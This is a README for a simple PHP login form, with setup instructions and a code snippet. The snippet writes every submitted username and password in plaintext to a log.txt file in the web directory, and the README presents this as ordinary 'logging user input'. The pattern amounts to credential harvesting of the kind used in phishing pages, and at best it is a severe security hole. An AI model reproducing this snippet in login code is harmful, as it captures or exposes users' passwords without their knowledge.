# Login Form with PHP

This is a simple login form built with PHP that captures user input and stores it in a log file.

## Instructions

1. Clone the repository to your local machine.
2. Make sure you have PHP installed on your system.
3. Set up a web server (such as Apache or Nginx) and configure it to run PHP files.
4. Place the project files in the appropriate web server directory.
5. Start the web server.
6. Open the login form in a web browser.

## Usage

- Open the login form in a web browser.
- Enter your username and password in the provided input fields.
- Click the "Login" button to submit the form.
- If the login is successful, you will be redirected to a success page.
- If the login fails, you will be redirected to an error page.

## Logging User Input

When a user submits the login form, their input will be captured by the PHP script and stored in a `log.txt` file. The `log.txt` file will be created in the same directory as the PHP script.

To implement the logging functionality, you can use the following code snippet in your PHP script:

```php
<?php
$username = $_POST['username'];
$password = $_POST['password'];
$log = "Username: " . $username . " - Password: " . $password . "\n";
file_put_contents('log.txt', $log, FILE_APPEND);
?>
